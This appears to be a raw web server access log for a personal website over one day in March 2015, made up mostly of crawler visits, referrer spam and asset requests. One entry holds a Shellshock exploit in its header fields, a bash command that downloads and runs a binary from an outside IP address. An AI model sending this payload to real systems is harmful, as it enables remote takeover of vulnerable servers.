200.11.10.114 - - [10/Mar/2015:01:10:44 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.11.10.114 - - [10/Mar/2015:01:10:45 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.11.10.114 - - [10/Mar/2015:01:10:45 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.11.10.114 - - [10/Mar/2015:01:10:45 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
66.249.73.131 - - [10/Mar/2015:01:22:27 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.96 - - [10/Mar/2015:01:41:35 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.95 - - [10/Mar/2015:01:42:08 +0000] "GET /assets/js/jquery.fitvids.js?v=a10debbef2 HTTP/1.1" 404 206 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
78.46.105.91 - - [10/Mar/2015:02:23:38 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; 007ac9 Crawler; http://crawler.007ac9.net/)"
78.46.105.91 - - [10/Mar/2015:02:23:38 +0000] "GET /robots.txt HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; 007ac9 Crawler; http://crawler.007ac9.net/)"
78.46.105.91 - - [10/Mar/2015:02:23:38 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; 007ac9 Crawler; http://crawler.007ac9.net/)"
46.119.118.191 - - [10/Mar/2015:02:28:05 +0000] "GET / HTTP/1.1" 200 3257 "http://www.seoboxer.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.3 (build 01218); .NET CLR 1.1.4322)"
46.119.118.191 - - [10/Mar/2015:02:28:06 +0000] "GET / HTTP/1.1" 200 3257 "http://www.seoboxer.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.3 (build 01218); .NET CLR 1.1.4322)"
46.119.118.191 - - [10/Mar/2015:02:28:08 +0000] "GET / HTTP/1.1" 200 3257 "http://www.seoboxer.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.3 (build 01218); .NET CLR 1.1.4322)"
180.76.4.100 - - [10/Mar/2015:02:44:59 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
58.217.103.4 - - [10/Mar/2015:03:33:54 +0000] "GET / HTTP/1.1" 200 3257 "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://202.195.195.210:8080/24 -O /tmp/China.Z-zlgl\xB0 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-zlgl\xB0 >> /tmp/Run.sh;echo /tmp/China.Z-zlgl\xB0 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22" "() { :; }; /bin/bash -c \x22rm -rf /tmp/*;echo wget http://202.195.195.210:8080/24 -O /tmp/China.Z-zlgl\xB0 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-zlgl\xB0 >> /tmp/Run.sh;echo /tmp/China.Z-zlgl\xB0 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\x22"
176.8.89.30 - - [10/Mar/2015:04:02:38 +0000] "GET / HTTP/1.1" 200 3257 "http://wma.su/" "Mozilla/4.0 (compatible; Powermarks/3.5; Windows 95/98/2000/NT)"
176.8.89.30 - - [10/Mar/2015:04:02:38 +0000] "GET / HTTP/1.1" 200 3257 "http://wma.su/" "Mozilla/4.0 (compatible; Powermarks/3.5; Windows 95/98/2000/NT)"
176.8.89.30 - - [10/Mar/2015:04:02:39 +0000] "GET / HTTP/1.1" 200 3257 "http://wma.su/" "Mozilla/4.0 (compatible; Powermarks/3.5; Windows 95/98/2000/NT)"
85.18.173.109 - - [10/Mar/2015:04:17:56 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
66.249.80.118 - - [10/Mar/2015:04:22:52 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
66.249.80.3 - - [10/Mar/2015:04:22:52 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
178.137.18.185 - - [10/Mar/2015:04:27:11 +0000] "GET / HTTP/1.1" 200 3257 "http://www.knowed.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4"
178.137.18.185 - - [10/Mar/2015:04:27:11 +0000] "GET / HTTP/1.1" 200 3257 "http://www.knowed.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4"
178.137.18.185 - - [10/Mar/2015:04:27:12 +0000] "GET / HTTP/1.1" 200 3257 "http://www.knowed.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Netscape/8.0.4"
180.76.4.11 - - [10/Mar/2015:04:40:29 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.73.243 - - [10/Mar/2015:06:20:53 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.80.126 - - [10/Mar/2015:06:29:20 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
180.76.4.197 - - [10/Mar/2015:06:39:21 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
85.18.173.109 - - [10/Mar/2015:07:20:45 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
109.120.157.179 - - [10/Mar/2015:07:57:44 +0000] "GET / HTTP/1.1" 200 3257 "http://chimiver.info/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)"
109.120.157.179 - - [10/Mar/2015:07:57:45 +0000] "GET / HTTP/1.1" 200 3257 "http://chimiver.info/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)"
109.120.157.179 - - [10/Mar/2015:07:57:45 +0000] "GET / HTTP/1.1" 200 3257 "http://chimiver.info/" "Mozilla/5.0 (compatible; Add Catalog/2.1;)"
91.207.8.46 - - [10/Mar/2015:08:13:10 +0000] "GET / HTTP/1.1" 200 3257 "http://skins4mine.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]"
91.207.8.46 - - [10/Mar/2015:08:13:11 +0000] "GET / HTTP/1.1" 200 3257 "http://skins4mine.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]"
91.207.8.46 - - [10/Mar/2015:08:13:11 +0000] "GET / HTTP/1.1" 200 3257 "http://skins4mine.ru/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 2000) Opera 6.0 [en]"
141.212.122.42 - - [10/Mar/2015:08:25:35 +0000] "GET / HTTP/1.1" 200 3257 "-" "-"
180.76.4.222 - - [10/Mar/2015:08:38:07 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
157.55.39.219 - - [10/Mar/2015:10:23:41 +0000] "GET /contact/ HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.4.193 - - [10/Mar/2015:10:44:07 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
64.69.91.210 - - [10/Mar/2015:11:41:01 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5"
66.249.73.243 - - [10/Mar/2015:11:58:08 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
61.240.144.66 - - [10/Mar/2015:12:26:17 +0000] "GET / HTTP/1.0" 200 3257 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
180.76.4.162 - - [10/Mar/2015:12:40:45 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.73.131 - - [10/Mar/2015:13:02:17 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.161 - - [10/Mar/2015:13:26:20 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.131 - - [10/Mar/2015:13:49:23 +0000] "GET /MattEllsworth-Devops-Resume.pdf HTTP/1.1" 200 151973 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
180.76.4.44 - - [10/Mar/2015:14:37:54 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
88.203.104.89 - - [10/Mar/2015:15:50:47 +0000] "GET / HTTP/1.1" 200 1158 "http://semalt.semalt.com/crawler.php?u=http://matthewellsworth.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
88.203.104.89 - - [10/Mar/2015:15:50:47 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
88.203.104.89 - - [10/Mar/2015:15:50:48 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
88.203.104.89 - - [10/Mar/2015:15:50:48 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
88.203.104.89 - - [10/Mar/2015:15:50:48 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
88.203.104.89 - - [10/Mar/2015:15:50:48 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
88.203.104.89 - - [10/Mar/2015:15:50:48 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
5.164.84.206 - - [10/Mar/2015:15:56:32 +0000] "GET / HTTP/1.1" 200 1158 "http://yandex.ru/yandsearch?text=matthewellsworth.com&lr=213" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MASPJS)"
5.164.84.206 - - [10/Mar/2015:15:56:32 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MASPJS)"
5.164.84.206 - - [10/Mar/2015:15:56:32 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MASPJS)"
5.164.84.206 - - [10/Mar/2015:15:56:32 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MASPJS)"
5.164.84.206 - - [10/Mar/2015:15:56:32 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MASPJS)"
5.164.84.206 - - [10/Mar/2015:15:56:33 +0000] "GET /assets/glyphicons-halflings-regular.eot? HTTP/1.1" 200 20335 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; MASPJS)"
180.76.5.176 - - [10/Mar/2015:16:02:50 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.4.90 - - [10/Mar/2015:16:40:18 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
188.165.15.132 - - [10/Mar/2015:16:40:30 +0000] "GET /posts/{{%20urlify(post.title)%20}} HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
128.61.240.66 - - [10/Mar/2015:17:22:03 +0000] "GET / HTTP/1.0" 200 3257 "-" "netscan.gtisc.gatech.edu"
66.249.73.131 - - [10/Mar/2015:18:32:08 +0000] "GET /robots.txt HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.131 - - [10/Mar/2015:18:32:08 +0000] "GET /rss/ HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.224 - - [10/Mar/2015:18:47:34 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.80.3 - - [10/Mar/2015:19:07:24 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon"
180.76.5.17 - - [10/Mar/2015:19:25:30 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
200.185.200.137 - - [10/Mar/2015:20:13:43 +0000] "GET / HTTP/1.1" 200 1158 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.185.200.137 - - [10/Mar/2015:20:13:43 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.185.200.137 - - [10/Mar/2015:20:13:44 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.185.200.137 - - [10/Mar/2015:20:13:44 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.185.200.137 - - [10/Mar/2015:20:13:44 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.185.200.137 - - [10/Mar/2015:20:13:44 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
200.185.200.137 - - [10/Mar/2015:20:13:44 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
180.76.4.116 - - [10/Mar/2015:20:46:43 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
50.56.228.100 - - [10/Mar/2015:20:58:46 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.56.228.100 - - [10/Mar/2015:20:58:46 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.56.228.100 - - [10/Mar/2015:20:58:46 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.56.228.100 - - [10/Mar/2015:20:58:46 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.56.228.100 - - [10/Mar/2015:20:58:47 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.56.228.100 - - [10/Mar/2015:20:58:47 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
50.56.228.100 - - [10/Mar/2015:20:58:47 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
8.28.16.254 - - [10/Mar/2015:20:59:25 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET /assets HTTP/1.1" 301 193 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
